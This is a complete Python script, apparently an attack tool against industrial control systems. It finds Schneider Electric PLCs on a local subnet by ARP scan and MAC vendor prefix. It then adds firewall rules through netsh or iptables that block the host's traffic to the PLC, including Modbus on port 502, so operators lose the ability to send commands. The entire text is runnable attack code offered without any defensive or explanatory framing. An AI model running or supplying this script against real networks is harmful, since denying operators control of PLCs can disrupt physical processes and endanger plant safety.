import scapy.all as scapy
import socket
import os
import platform

# Function to discover the PLC's IP address on the network
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[+] Scanning network for Schneider Electric PLC...")

    # Perform ARP scan
    arp_request = scapy.ARP(pdst=network_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc

        # Check if the MAC address belongs to Schneider Electric (00:80:F4 is a known vendor prefix)
        if mac.startswith("00:80:F4"):
            print(f"[+] Found PLC: IP = {ip}, MAC = {mac}")
            return ip

    print("[-] No Schneider PLC found in the network scan.")
    return None

# Function to block command messages
def block_plc_commands(plc_ip):
    if not plc_ip:
        print("[-] PLC IP address not found. Exiting...")
        return

    print(f"[+] Blocking command messages to PLC at {plc_ip}...")

    if platform.system() == "Windows":
        # Using Windows firewall to block traffic
        os.system(f'netsh advfirewall firewall add rule name="Block PLC {plc_ip}" dir=out action=block remoteip={plc_ip}')
        os.system(f'netsh advfirewall firewall add rule name="Block Modbus {plc_ip}" dir=out action=block protocol=TCP remoteport=502')
        os.system(f'netsh advfirewall firewall add rule name="Block Machine Expert" dir=out action=block protocol=TCP remoteport=1105')
    
    elif platform.system() == "Linux":
        # Using iptables to drop packets to PLC
        os.system(f"sudo iptables -A OUTPUT -d {plc_ip} -p tcp --dport 502 -j DROP")  # Blocking Modbus
        os.system(f"sudo iptables -A OUTPUT -d {plc_ip} -p tcp --dport 1105 -j DROP")  # Blocking Machine Expert
        os.system(f"sudo iptables -A OUTPUT -d {plc_ip} -j DROP")  # Blocking all outbound traffic to PLC
    
    print("[+] Successfully blocked command messages.")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip("192.168.1.0/24")  # Change subnet based on network
    block_plc_commands(plc_ip)